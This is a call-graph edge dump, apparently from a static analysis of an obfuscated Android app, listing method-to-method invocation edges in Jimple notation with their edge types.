VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lkq: int hashCode()>
VIRTUAL edge: $r3 = virtualinvoke $r2.<mly: java.lang.IllegalArgumentException f()>() in <lkt: lkx b(boolean)> ==> <mly: java.lang.IllegalArgumentException f()>
VIRTUAL edge: $c1 = virtualinvoke $r0.<java.lang.String: char charAt(int)>(2) in <ivw: boolean F(java.lang.String)> ==> <java.lang.String: char charAt(int)>
STATIC edge: $r0 = staticinvoke <j$.util.concurrent.r: j$.util.concurrent.s g(j$.util.concurrent.s,j$.util.concurrent.s)>($r0, $r2) in <j$.util.concurrent.r: j$.util.concurrent.s c(j$.util.concurrent.s,j$.util.concurrent.s)> ==> <j$.util.concurrent.r: j$.util.concurrent.s g(j$.util.concurrent.s,j$.util.concurrent.s)>
INTERFACE edge: $r2 = interfaceinvoke $r3.<java.util.Map: java.lang.Object put(java.lang.Object,java.lang.Object)>($r2, $r1) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.util.HashMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalStateException: void <init>(java.lang.String)>($r4) in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.IllegalStateException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r4.<nzh: void d()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: void d()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <lid: int hashCode()>
VIRTUAL edge: $r14 = virtualinvoke $r7.<lts: lsz c(int)>($i1) in <lsd: boolean b(lsr)> ==> <lsm: lsz c(int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <j$.util.concurrent.k: boolean equals(java.lang.Object)> ==> <lta: boolean equals(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <lrg: int hashCode()>
STATIC edge: $z0 = staticinvoke <ivw: boolean O(char)>($c2) in <ivw: boolean s(java.lang.String)> ==> <ivw: boolean O(char)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r4) in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
SPECIAL edge: specialinvoke $r6.<j$.util.concurrent.w: void <init>()>() in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <j$.util.concurrent.w: void <init>()>
VIRTUAL edge: $i6 = virtualinvoke $r3.<java.lang.Object: int hashCode()>() in <lma: lma i(int,java.lang.Object[])> ==> <lqr: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lma: boolean equals(java.lang.Object)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorAutocompleteMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(45) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lrg: int hashCode()> ==> <lrg: int hashCode()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lqs: lsa l()>() in <lqs: java.util.Iterator iterator()> ==> <lqs: lsa l()>
VIRTUAL edge: $i0 = virtualinvoke r0.<ljd: int e()>() in <ljd: java.util.Map m()> ==> <ljd: int e()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lkq: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lkq: boolean equals(java.lang.Object)>
INTERFACE edge: $r3 = interfaceinvoke $r8.<java.util.Map$Entry: java.lang.Object getKey()>() in <lmb: lme f()> ==> <ljb: java.lang.Object getKey()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <nzh: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljf: java.util.Set g()>() in <ljf: java.util.Iterator iterator()> ==> <ljf: java.util.Set g()>
SPECIAL edge: specialinvoke $r2.<nzh: void <init>()>() in <ivv: void <init>(byte[])> ==> <nzh: void <init>()>
STATIC edge: staticinvoke <ojg: void d(java.lang.Object,java.lang.String)>($r1, "destination") in <nvw: void j(int[],int[],int,int,int)> ==> <ojg: void d(java.lang.Object,java.lang.String)>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lrg: int size()>
INTERFACE edge: $r4 = interfaceinvoke $r3.<java.util.Map: java.lang.Object get(java.lang.Object)>($r1) in <lli: void e(java.lang.Object,java.lang.Object)> ==> <ljd: java.lang.Object get(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.String: int length()>() in <ivv: void g(java.lang.String)> ==> <java.lang.String: int length()>
VIRTUAL edge: $r7 = virtualinvoke $r4.<nzh: java.lang.String c()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: java.lang.String c()>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lmb: lme f()> ==> <lnc: boolean hasNext()>
STATIC edge: $r5 = staticinvoke <lqd: lqd b(java.util.Comparator)>($r4) in <lmb: lme f()> ==> <lqd: lqd b(java.util.Comparator)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lkq: int size()>() in <lkq: int hashCode()> ==> <lql: int size()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lkq: int hashCode()>
SPECIAL edge: specialinvoke $r25.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.l)>($i5, $r15, $r16, $r10) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.l)>
INTERFACE edge: $z0 = interfaceinvoke $r10.<java.util.Iterator: boolean hasNext()>() in <hbv: void j()> ==> <lnc: boolean hasNext()>
SPECIAL edge: $r3 = specialinvoke r0.<ljf: java.lang.Object[] s()>() in <ljf: void j(int,java.lang.Object,int,int)> ==> <ljf: java.lang.Object[] s()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <lqr: int hashCode()>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lta: boolean equals(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lma: boolean equals(java.lang.Object)>
STATIC edge: $r6 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i4) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
STATIC edge: $i0 = staticinvoke <izw: int ag(int,int,int)>($i0, $i1, 31) in <ljf: void q(int)> ==> <izw: int ag(int,int,int)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.LinkageError: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke r0.<lsn: void q(lsz,java.lang.Object)>($r3, $r24) in <lsd: boolean b(lsr)> ==> <lsn: void q(lsz,java.lang.Object)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" threw ") in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r7 = virtualinvoke $r4.<nzh: java.lang.String c()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: java.lang.String c()>
INTERFACE edge: $r2 = interfaceinvoke $r9.<java.util.Map$Entry: java.lang.Object getValue()>() in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.k: java.lang.Object getValue()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <j$.sun.misc.b: void <init>(sun.misc.Unsafe)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lta: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <lvm: void h(boolean,java.lang.String)>($z0, "maxDepth must be > 0 or -1") in <lwk: java.lang.StackTraceElement[] b(java.lang.Class,int)> ==> <lvm: void h(boolean,java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke r0.<lma: boolean d()>() in <lma: boolean equals(java.lang.Object)> ==> <lma: boolean d()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkq: lsb B()>() in <lkq: java.util.Iterator iterator()> ==> <lkq: lsb B()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r9 = virtualinvoke $r8.<lme: lma d(java.lang.Object)>($r13) in <hbv: void j()> ==> <lme: lma d(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<lql: void <init>(java.lang.Object[],int)>($r1, $i0) in <lkq: lkq h(java.lang.Object[],int)> ==> <lql: void <init>(java.lang.Object[],int)>
INTERFACE edge: $r4 = interfaceinvoke $r3.<java.util.Map$Entry: java.lang.Object getValue()>() in <lvr: int a(java.util.Map$Entry,int,int,java.lang.Object[],int[])> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getValue()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <hfd: void <init>(hff,java.lang.Class,ldp)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: virtualinvoke r0.<lkh: int b(java.lang.Object[],int)>($r1, 0) in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lrg: int b(java.lang.Object[],int)>
SPECIAL edge: specialinvoke r0.<lma: void <init>()>() in <lrg: void <init>(java.lang.Object)> ==> <lma: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
STATIC edge: $r2 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
INTERFACE edge: $r5 = interfaceinvoke $r2.<java.util.List: java.util.Iterator iterator()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lkq: java.util.Iterator iterator()>
VIRTUAL edge: virtualinvoke r0.<nzh: void d()>() in <nzh: boolean f(ivv)> ==> <nzh: void d()>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Enum: void <init>(java.lang.String,int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $i1 = staticinvoke <izw: int ak(int)>($i0) in <ljd: int b()> ==> <izw: int ak(int)>
SPECIAL edge: $z1 = specialinvoke $r2.<ivw: boolean P()>() in <ivw: boolean equals(java.lang.Object)> ==> <ivw: boolean P()>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Map: java.util.Set entrySet()>() in <lmb: lme f()> ==> <ljd: java.util.Set entrySet()>
STATIC edge: $z0 = staticinvoke <ivw: boolean t(char[],int,int)>($r3, $i0, $i1) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean t(char[],int,int)>
STATIC edge: $i6 = staticinvoke <izw: int ag(int,int,int)>($i7, $i8, $i4) in <ljf: int o(int,int,int,int)> ==> <izw: int ag(int,int,int)>
STATIC edge: $i2 = staticinvoke <j$.util.concurrent.ThreadLocalRandom: int b()>() in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ThreadLocalRandom: int b()>
STATIC edge: $i1 = staticinvoke <izw: int ak(int)>($i0) in <ljf: int b()> ==> <izw: int ak(int)>
INTERFACE edge: $z0 = interfaceinvoke $r6.<java.util.Iterator: boolean hasNext()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lsb: boolean hasNext()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <java.lang.Enum: void <init>(java.lang.String,int)> ==> <java.lang.Object: void <init>()>
INTERFACE edge: $r3 = interfaceinvoke $r2.<java.util.Map$Entry: java.lang.Object getKey()>() in <lid: boolean equals(java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
SPECIAL edge: $i4 = specialinvoke r0.<ljd: int z(int,int,int,int)>($i4, $i5, $i3, $i0) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: int z(int,int,int,int)>
STATIC edge: staticinvoke <java.lang.Double: boolean isNaN(double)>($d0) in <lma: int e(int)> ==> <java.lang.Double: boolean isNaN(double)>
STATIC edge: staticinvoke <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)>
VIRTUAL edge: $r9 = virtualinvoke $r7.<lme: lma c()>() in <hbv: void j()> ==> <lme: lma c()>
STATIC edge: $i0 = staticinvoke <izw: int ag(int,int,int)>($i0, $i1, 31) in <ljd: void A(int)> ==> <izw: int ag(int,int,int)>
SPECIAL edge: specialinvoke r0.<lli: void <init>()>() in <lmb: void <init>()> ==> <lli: void <init>()>
INTERFACE edge: $z0 = interfaceinvoke $r6.<java.util.Iterator: boolean hasNext()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lsb: boolean hasNext()>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <lrg: int hashCode()>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lsb: java.lang.Object next()>
SPECIAL edge: specialinvoke $r5.<java.util.ConcurrentModificationException: void <init>()>() in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.util.ConcurrentModificationException: void <init>()>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lqs: boolean equals(java.lang.Object)> ==> <ljf: int size()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r1, $r2) in <lkt: void a(java.lang.Object,java.lang.Object)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
VIRTUAL edge: virtualinvoke $r6.<gwk: void a(gwm)>(r0) in <hcb: void <init>()> ==> <gwk: void a(gwm)>
STATIC edge: staticinvoke <iye: void y(boolean,java.lang.Object)>(1, "Expected size must be >= 0") in <ljf: void i(int)> ==> <iye: void y(boolean,java.lang.Object)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lkq: int hashCode()>
SPECIAL edge: specialinvoke $r0.<miv: void <init>(java.lang.Object)>($r1) in <kwe: miy x(java.lang.Object)> ==> <miv: void <init>(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <java.util.AbstractSet: int hashCode()>
STATIC edge: $r4 = staticinvoke <lma: lma w(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object[])>("ar-XT", "bgp-XC", "bgp-XT", "bgq-PK", "bgq-XU", "bm-XF", $r0) in <ivw: void <clinit>()> ==> <lma: lma w(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object[])>
CLINIT edge: staticinvoke <lsh: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lsh: void <clinit>()>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljd: java.lang.Object[] y()>() in <ljd: void u(int,java.lang.Object)> ==> <ljd: java.lang.Object[] y()>
VIRTUAL edge: virtualinvoke r0.<ljf: void i(int)>(3) in <ljf: void <init>()> ==> <ljf: void i(int)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<lkq: java.lang.Object get(int)>($i0) in <lkm: java.lang.Object a(int)> ==> <lql: java.lang.Object get(int)>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r7, $i3, $r1, $i1, $i2) in <lvr: int a(java.util.Map$Entry,int,int,java.lang.Object[],int[])> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lqo: lsa l()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Integer: java.lang.Integer valueOf(int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lrg: int hashCode()> ==> <lid: int hashCode()>
SPECIAL edge: specialinvoke r0.<lma: void <init>()>() in <lqr: void <init>(java.lang.Object[],int,java.lang.Object[],int,int)> ==> <lma: void <init>()>
SPECIAL edge: specialinvoke $r3.<ivw: void <init>(ivv,java.lang.String)>(r0, $r2) in <ivv: ivw i(java.lang.String)> ==> <ivw: void <init>(ivv,java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lma: int hashCode()>
VIRTUAL edge: $z2 = virtualinvoke $r9.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l6, $i7, $i5) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
SPECIAL edge: specialinvoke $r0.<java.lang.String: void <init>()>() in <lsn: void <clinit>()> ==> <java.lang.String: void <init>()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Parameter specified as non-null is null: method ") in <ojg: void v(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r3) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<java.lang.ThreadLocal: void <init>()>() in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.lang.ThreadLocal: void <init>()>
STATIC edge: staticinvoke <iye: void Q(int,int)>($i1, $i0) in <lsb: void <init>(int,int)> ==> <iye: void Q(int,int)>
SPECIAL edge: specialinvoke $r3.<lqq: void <init>(java.lang.Object,java.lang.Object[],int)>(null, $r0, 1) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <lqq: void <init>(java.lang.Object,java.lang.Object[],int)>
STATIC edge: $i1 = staticinvoke <j$.util.concurrent.ThreadLocalRandom: int a(int)>($i1) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ThreadLocalRandom: int a(int)>
CLINIT edge: staticinvoke <hbu: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <hbu: void <clinit>()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<lma: boolean m()>() in <lma: lma p(java.util.Collection)> ==> <lqr: boolean m()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lid: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke r0.<ljf: void j(int,java.lang.Object,int,int)>($i0, $r1, $i3, $i5) in <ljf: boolean add(java.lang.Object)> ==> <ljf: void j(int,java.lang.Object,int,int)>
STATIC edge: staticinvoke <iye: void y(boolean,java.lang.Object)>(1, "the total number of elements must fit in an int") in <lma: lma w(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object[])> ==> <iye: void y(boolean,java.lang.Object)>
STATIC edge: $r6 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i4) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
INTERFACE edge: $r6 = interfaceinvoke $r4.<java.util.Set: java.util.Iterator iterator()>() in <lqs: boolean equals(java.lang.Object)> ==> <lqr: java.util.Iterator iterator()>
STATIC edge: $r3 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r3) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lmb: lme f()> ==> <lqr: int size()>
STATIC edge: $r4 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>($r3, $i2) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r4) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r4.<java.lang.Throwable: void <init>()>() in <lwk: java.lang.StackTraceElement[] b(java.lang.Class,int)> ==> <java.lang.Throwable: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke $r0.<java.lang.StringBuilder: java.lang.String toString()>() in <lri: void t(java.lang.Object,int)> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $r4 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r4) in <lqm: java.lang.Object get(int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lkq: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <lmo: lqs G(java.util.Comparator)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke r0.<lkh: int c()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lql: int c()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <izw: void as(int,java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lta: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.Object: int hashCode()>() in <izw: int ad(java.lang.Object)> ==> <lrg: int hashCode()>
VIRTUAL edge: $c2 = virtualinvoke $r0.<java.lang.String: char charAt(int)>($i0) in <ivw: boolean v(java.lang.String)> ==> <java.lang.String: char charAt(int)>
VIRTUAL edge: $z0 = virtualinvoke $r6.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <lsp: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(4) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: specialinvoke r0.<lsn: void <init>(java.util.logging.Level)>($r1) in <lsd: void <init>(java.util.logging.Level)> ==> <lsn: void <init>(java.util.logging.Level)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <lkq: int hashCode()>
INTERFACE edge: interfaceinvoke $r9.<lse: void F(java.lang.String,java.lang.Object,java.lang.Object)>("Locale %s has invalid language \'%s\', fallback to \'en\'", $r0, $r4) in <ivw: ivw d(java.util.Locale)> ==> <lsn: void F(java.lang.String,java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<lwc: void <init>()>() in <lwe: void <init>()> ==> <lwc: void <init>()>
SPECIAL edge: specialinvoke $r2.<java.lang.NullPointerException: void <init>(java.lang.String)>($r4) in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
STATIC edge: $r11 = staticinvoke <lma: lma p(java.util.Collection)>($r10) in <lmb: lme f()> ==> <lma: lma p(java.util.Collection)>
VIRTUAL edge: $i6 = virtualinvoke $r3.<java.lang.Object: int hashCode()>() in <lma: lma i(int,java.lang.Object[])> ==> <lrg: int hashCode()>
STATIC edge: $z0 = staticinvoke <kzs: boolean d(java.lang.Object,java.lang.Object)>($r1, $r5) in <ljf: boolean add(java.lang.Object)> ==> <kzs: boolean d(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: int hashCode()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkx: lma f()>() in <lkx: lma p()> ==> <lqq: lma f()>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Map$Entry: java.lang.Object getKey()>() in <lli: void c(java.util.Map$Entry)> ==> <ljb: java.lang.Object getKey()>
INTERFACE edge: $z1 = interfaceinvoke $r1.<java.util.Iterator: boolean hasNext()>() in <izw: boolean D(java.util.Collection,java.util.Iterator)> ==> <liz: boolean hasNext()>
STATIC edge: $i5 = staticinvoke <izw: int af(int,int)>($i3, $i4) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <izw: int af(int,int)>
VIRTUAL edge: $r7 = virtualinvoke r0.<lqs: lsa l()>() in <lqs: boolean equals(java.lang.Object)> ==> <lqs: lsa l()>
VIRTUAL edge: virtualinvoke r0.<nzh: void d()>() in <nzh: boolean f(ivv)> ==> <nzh: void d()>
VIRTUAL edge: virtualinvoke $r2.<j$.sun.misc.b: void l(java.lang.Object,long,java.lang.Object)>($r0, $l0, $r1) in <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)> ==> <j$.sun.misc.b: void l(java.lang.Object,long,java.lang.Object)>
STATIC edge: $i7 = staticinvoke <izw: int aj(java.lang.Object,int)>($r5, $i6) in <ljf: boolean add(java.lang.Object)> ==> <izw: int aj(java.lang.Object,int)>
INTERFACE edge: $r3 = interfaceinvoke $r1.<java.util.Map$Entry: java.lang.Object getValue()>() in <lli: void c(java.util.Map$Entry)> ==> <ljb: java.lang.Object getValue()>
STATIC edge: $z0 = staticinvoke <lma: boolean x(int,int)>($i0, $i1) in <lly: lma g()> ==> <lma: boolean x(int,int)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Integer: int rotateLeft(int,int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
